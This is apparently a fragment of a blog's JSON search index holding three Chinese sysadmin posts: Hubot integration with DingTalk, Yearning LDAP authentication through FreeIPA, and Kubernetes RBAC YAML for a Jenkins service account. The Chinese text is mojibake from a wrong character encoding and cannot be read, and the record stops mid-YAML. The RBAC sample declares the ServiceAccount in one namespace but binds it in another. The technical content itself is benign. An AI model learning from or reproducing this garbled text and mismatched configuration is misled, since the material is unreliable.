å°„åçš„åœ°å€ï¼šhttps://bot.rendoumi.com/hubot/dingtalk/message/ï¼ˆç”¨ä¸ç”¨nginxåŠ è¯ä¹¦å˜httpséšå…·ä½“æƒ…å†µå®šï¼‰\nç„¶åå»hubotå®‰è£…dingtalkæ’ä»¶ï¼Œåœ¨hubotå®‰è£…æ ¹ç›®å½•è¿è¡Œ\nnpm install hubot-dingtalk export HUBOT_DINGTALK_AUTH_TYPE=sign export HUBOT_DINGTALK_SECRET=xxxxxxxxxx export HUBOT_DINGTALK_MODE=1 ./bin/hubot -a dingtalk ç„¶åæˆ‘ä»¬å»ç”¨æµè§ˆå™¨è®¿é—® https://bot.rendoumi.com/hubot/dingtalk/message/ï¼Œä¼šè¿”å›è¿™ä¸ª\nç„¶åå°±å¯ä»¥äº†ã€‚è‡³äºæŠŠ hubot åšæˆæœåŠ¡ï¼Œå°±å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ï¼ŒæŠŠjenkinså’Œansibleéƒ½åŠ ä¸Šï¼Œåšä¸€ä¸ªå¥½ç”¨çš„æœºå™¨äººã€‚\n","permalink":"https://rendoumi.com/posts/20230301-hubot_dingding/","summary":"\u003cp\u003eæ¢äº†å…¬å¸ï¼Œç°åœ¨çš„å…¬å¸ç”¨çš„æ˜¯é’‰é’‰ï¼Œä¸æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œé‚£ä¹ˆ hubot å°±å¾—æ”¹æ¥å…¥é’‰é’‰äº†\u003c/p\u003e\n\u003cp\u003eå‰æ–‡å›é¡¾ï¼š\u003ca href=\"../20211222-hubot_wechat/\"\u003eHuboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä¸æ˜ç™½çš„å¯ä»¥å…ˆçœ‹é‚£ä¸€ç¯‡ï¼Œé‚£ä¹ˆé¦–å…ˆçš„æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·è¦å»é’‰é’‰å¼€æ”¾å¹³å°ï¼Œç”¨ç®¡ç†å‘˜ç™»å½•ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://open.dingtalk.com/\"\u003ehttps://open.dingtalk.com/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç™»é™†åï¼Œç‚¹å‡»åº”ç”¨å¼€å‘\u0026ndash;\u0026gt;ä¼ä¸šåº”ç”¨å¼€å‘ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301105804714\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105804714.png\"\u003eâ€™\u003c/p\u003e\n\u003cp\u003eç„¶ååº”ç”¨å¼€å‘ï¼Œæœºå™¨äººï¼Œç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105903419.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå»ºå¥½åï¼Œç‚¹å‡»åº”ç”¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å‡­è¯\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è®°å½•ä¸‹æ¥ \u003cstrong\u003eAppSecret\u003c/strong\u003eï¼Œä¹‹åè¦ç”¨åˆ°\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301110516010\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301110516010.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå†ç‚¹å‡»å¼€å‘ç®¡ç†ï¼Œè¿™é‡Œéœ€è¦ä½ æŠŠ hubot çš„æœåŠ¡å™¨åœ°å€ç»™å…¬å¸ƒå‡ºå»ï¼Œéœ€è¦æœ‰ä¸ªå…¬ç½‘åœ°å€\u003c/p\u003e\n\u003cp\u003eå› ä¸ºhubotæ˜¯ç›‘å¬çš„8080ç«¯å£ï¼Œæ‰€ä»¥æ˜ å°„æ˜¯ xxxx.ip:80 \u0026ndash;\u0026gt; hubotip:8080\u003c/p\u003e\n\u003cp\u003eæœåŠ¡å™¨å‡ºå£ IP çš„åœ°æ–¹ , éœ€è¦åœ¨ hubot çš„æœåŠ¡å™¨ä¸Šï¼Œcurl \u003ca href=\"http://ipinfo.io\"\u003ehttp://ipinfo.io\u003c/a\u003eï¼Œå¾—åˆ°åœ°å€ï¼Œç„¶åå¡«ä¸Šï¼ˆæˆ‘ä»¬çš„ ip éå¸¸ç‰¹æ®Šï¼Œæ¯ä¸€æ¬¡è®¿é—®éƒ½æœ‰å¯èƒ½ä¼šæ¢ä¸ªipï¼Œæ‰€ä»¥åªå¥½æŠŠæ•´æ®µå¡«å†™è¿›å»ï¼Œè€Œä¸”æŠŠå…¬ç½‘æ˜ å°„ipä¹Ÿå¡«è¿›å»ï¼‰\u003c/p\u003e\n\u003cp\u003eæ¶ˆæ¯æ¥æ”¶åœ°å€å¡«ä¸Šæ˜ å°„åçš„åœ°å€ï¼š\u003ccode\u003ehttps://bot.rendoumi.com/hubot/dingtalk/message/\u003c/code\u003eï¼ˆç”¨ä¸ç”¨nginxåŠ è¯ä¹¦å˜httpséšå…·ä½“æƒ…å†µå®šï¼‰\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301105958063\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301105958063.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå»hubotå®‰è£…dingtalkæ’ä»¶ï¼Œåœ¨hubotå®‰è£…æ ¹ç›®å½•è¿è¡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install hubot-dingtalk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_AUTH_TYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esign\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_SECRET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003exxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHUBOT_DINGTALK_MODE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/hubot -a dingtalk\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæˆ‘ä»¬å»ç”¨æµè§ˆå™¨è®¿é—® \u003ccode\u003ehttps://bot.rendoumi.com/hubot/dingtalk/message/\u003c/code\u003eï¼Œä¼šè¿”å›è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230301132914868\" loading=\"lazy\" src=\"/posts/20230301-hubot_dingding/image-20230301132914868.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå°±å¯ä»¥äº†ã€‚è‡³äºæŠŠ hubot åšæˆæœåŠ¡ï¼Œå°±å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ï¼ŒæŠŠjenkinså’Œansibleéƒ½åŠ ä¸Šï¼Œåšä¸€ä¸ªå¥½ç”¨çš„æœºå™¨äººã€‚\u003c/p\u003e","title":"Huboté›†æˆä¼ä¸šé’‰é’‰"},{"content":"æ¥ä¸Šä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥æ•°æ®åº“ä¸Šçº¿è½¯ä»¶Yearning.\nå…ˆä¸‹ç»“è®ºï¼šåŒæ ·å­˜åœ¨å…ˆæœ‰ Yearning è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™æ¬¡è¦å‘½äº†ï¼Œå› ä¸º Yearning ä¸æ”¯æŒ LDAP è®¤è¯æ–¹å¼ç”¨æˆ·ä¸å·²æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ï¼æ‰€ä»¥ï¼Œç­‰äºldapæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼Œè·Ÿè€ç”¨æˆ·çš„é‚®ç®±ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯ä¸ª Newbeeï¼Œæ²¡æœ‰æƒé™ï¼Œéœ€è¦é‡æ–°èµ‹æƒã€‚æ¯”è¾ƒéº»çƒ¦ï¼å¸Œæœ›ä¹‹åèƒ½prä¿®æ”¹ä¸€ä¸‹ï¼ï¼ï¼ï¼\nè¿æ¥å±æ€§å¦‚ä¸‹ï¼š\nldapåœ°å€ï¼šfreeipa.bybon.cn:389 LDAPç®¡ç†å‘˜DNï¼šuid=manager,cn=users,cn=accounts,dc=bybon,dc=cn LDAPç®¡ç†å‘˜å¯†ç ï¼šxxxxxx LDAP_Search Filterï¼š(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)(uid=%s)) LDAP_SCBASEï¼šcn=users,cn=accounts,dc=bybon,dc=cn LDAPç”¨æˆ·å±æ€§ï¼š{ \u0026#34;real_name\u0026#34;: \u0026#34;displayName\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;department\u0026#34;: \u0026#34;æŠ€æœ¯ä¸­å¿ƒ\u0026#34; } è§£é‡Šä¸€ä¸‹ï¼š\nLDAP_Search Filter æŒ‡æœç´¢ç”¨æˆ·æ—¶æ‰€ç”¨çš„filterï¼Œè¿™é‡Œå·äº†ä¸ªæ‡’ï¼ŒæŒ‰é“ç†åº”è¯¥æ˜¯ç‹¬ç«‹å»ºä¸€ä¸ªç»„yearning-usersï¼Œæ‡’å¾—å¹²äº†ï¼Œå¤ç”¨confluence-userså¥½äº†ã€‚adminç»„æ›´æ‡’å¾—å»ºï¼Œå¿…é¡»ç”¨freeipaçš„adminsç»„\nLDAP_SCBASE æŒ‡æœç´¢ç”¨æˆ·çš„BASE DN\nLDAPç”¨æˆ·å±æ€§æŒ‡yearningä¸­çš„å±æ€§ä¸ldapå±æ€§ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œdepartmentæ˜¯æ²¡æœ‰å¯¹åº”çš„ï¼Œä¹Ÿæ²¡æœ‰äººä¼šæ²¡äº‹å¹²å»ºä¸€ä¸ªå»å§ã€‚\næˆªå›¾å¦‚ä¸‹ï¼š\n","permalink":"https://rendoumi.com/posts/20230228-freeipa_yearning/","summary":"\u003cp\u003eæ¥ä¸Šä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥æ•°æ®åº“ä¸Šçº¿è½¯ä»¶Yearning.\u003c/p\u003e\n\u003cp\u003eå…ˆä¸‹ç»“è®ºï¼šåŒæ ·å­˜åœ¨å…ˆæœ‰ Yearning è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™æ¬¡è¦å‘½äº†ï¼Œå› ä¸º Yearning ä¸æ”¯æŒ LDAP è®¤è¯æ–¹å¼ç”¨æˆ·ä¸å·²æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ï¼æ‰€ä»¥ï¼Œç­‰äºldapæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼Œè·Ÿè€ç”¨æˆ·çš„é‚®ç®±ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯ä¸ª Newbeeï¼Œæ²¡æœ‰æƒé™ï¼Œéœ€è¦é‡æ–°èµ‹æƒã€‚æ¯”è¾ƒéº»çƒ¦ï¼å¸Œæœ›ä¹‹åèƒ½prä¿®æ”¹ä¸€ä¸‹ï¼ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eè¿æ¥å±æ€§å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldapåœ°å€ï¼šfreeipa.bybon.cn:389\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAPç®¡ç†å‘˜DNï¼šuid\u003cspan class=\"o\"\u003e=\u003c/span\u003emanager,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAPç®¡ç†å‘˜å¯†ç ï¼šxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP_Search Filterï¼š\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003einetorgperson\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003ememberOf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003econfluence-users,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%s\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP_SCBASEï¼šcn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAPç”¨æˆ·å±æ€§ï¼š\u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;real_name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;displayName\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;email\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;department\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;æŠ€æœ¯ä¸­å¿ƒ\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLDAP_Search Filter æŒ‡æœç´¢ç”¨æˆ·æ—¶æ‰€ç”¨çš„filterï¼Œè¿™é‡Œå·äº†ä¸ªæ‡’ï¼ŒæŒ‰é“ç†åº”è¯¥æ˜¯ç‹¬ç«‹å»ºä¸€ä¸ªç»„yearning-usersï¼Œæ‡’å¾—å¹²äº†ï¼Œå¤ç”¨confluence-userså¥½äº†ã€‚adminç»„æ›´æ‡’å¾—å»ºï¼Œå¿…é¡»ç”¨freeipaçš„adminsç»„\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLDAP_SCBASE æŒ‡æœç´¢ç”¨æˆ·çš„BASE DN\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLDAPç”¨æˆ·å±æ€§æŒ‡yearningä¸­çš„å±æ€§ä¸ldapå±æ€§ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œdepartmentæ˜¯æ²¡æœ‰å¯¹åº”çš„ï¼Œä¹Ÿæ²¡æœ‰äººä¼šæ²¡äº‹å¹²å»ºä¸€ä¸ªå»å§ã€‚\u003c/p\u003e\n\u003cp\u003eæˆªå›¾å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230228114517030\" loading=\"lazy\" src=\"/posts/20230228-freeipa_yearning/image-20230228114517030.png\"\u003e\u003c/p\u003e","title":"yearningé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"content":"k8sé‡Œé¢å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç»™ç‰¹å®šæƒé™ï¼Œå†åšrolebindingçš„è¿‡ç¨‹ï¼Œç»™ä¸ªæ ‡å‡†çš„å»ºç«‹jenkins-adminçš„ç”¨æˆ·çš„è¿‡ç¨‹ï¼š\nç®€å•æ¥è¯´ï¼Œä¸‰æ­¥ï¼ŒServiceAccout \u0026ndash;\u0026gt; Role \u0026ndash;\u0026gt; Rolebinding\napiVersion: v1 kind: ServiceAccount metadata: name: jenkins-admin namespace: devops-tools --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: jenkins namespace: default labels: \u0026#34;app.kubernetes.io/name\u0026#34;: \u0026#39;jenkins\u0026#39; rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods\u0026#34;] verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/exec\u0026#34;] verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/log\u0026#34;] verbs: [\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;get\u0026#34;] --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: jenkins-role-binding namespace: default roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: jenkins subjects: - kind: ServiceAccount name: jenkins-admin namespace: default èµ„æºçš„é“¾æ¥ï¼šhttps://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/\n","permalink":"https://rendoumi.com/posts/20230222-kubernetes_rbac/","summary":"\u003cp\u003ek8sé‡Œé¢å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç»™ç‰¹å®šæƒé™ï¼Œå†åšrolebindingçš„è¿‡ç¨‹ï¼Œç»™ä¸ªæ ‡å‡†çš„å»ºç«‹jenkins-adminçš„ç”¨æˆ·çš„è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003eç®€å•æ¥è¯´ï¼Œä¸‰æ­¥ï¼ŒServiceAccout \u0026ndash;\u0026gt; Role \u0026ndash;\u0026gt; Rolebinding\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ServiceAccount\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: devops-tools\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: rbac.authorization.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: Role\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;app.kubernetes.io/name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;jenkins\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erules:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;create\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;delete\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;patch\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;update\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods/exec\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;create\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;delete\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;patch\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;update\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pods/log\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;list\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;watch\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- apiGroups: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resources: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  verbs: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;get\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: rbac.authorization.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: RoleBinding\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-role-binding\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroleRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  apiGroup: rbac.authorization.k8s.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 